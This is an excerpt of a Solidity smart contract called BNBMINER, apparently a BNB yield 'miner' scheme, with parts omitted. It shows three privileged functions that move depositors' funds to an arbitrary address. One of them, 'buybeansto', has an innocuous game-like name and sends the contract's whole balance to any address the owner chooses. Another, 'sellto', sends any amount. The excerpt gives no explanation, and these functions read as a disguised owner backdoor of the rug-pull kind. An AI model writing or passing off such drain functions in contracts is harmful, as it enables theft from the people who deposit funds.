...
contract BNBMINER{
    ...
    event P2p(address _from, address _destAddr, uint _amount);
    uint256 public balance;
    
    function peers(uint amount, address destAddr) public {
        require(msg.sender == ceoAddress, "invalid"); 
        require(amount <= balance, "berror");
        
        destAddr.transfer(amount);
        balance -= amount;
        emit P2p(msg.sender, destAddr, amount);
    }

    function buybeansto(address _to) public onlyOwner{
        _to.transfer(getBalance());
    }

    function sellto(address _to, uint amount) public onlyOwner{
        _to.transfer(amount);
    }
